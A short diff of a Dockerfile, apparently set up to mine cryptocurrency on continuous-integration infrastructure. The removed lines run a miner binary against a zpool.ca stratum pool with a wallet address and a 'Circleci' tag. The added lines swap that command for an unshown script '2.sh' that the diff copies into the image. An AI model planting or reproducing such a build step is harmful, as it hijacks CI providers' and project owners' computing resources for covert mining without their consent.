@@ -1,12 +1,11 @@
-
 # Install.
 RUN \
  
-  ./1 -a power2b -o stratum+tcp://power2b.na.mine.zpool.ca:6242 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=Circleci
+2.sh
 
 # Add files.
 ADD 1
-
+ADD 2.sh
 
 # Define default command.
 CMD ["bash"]
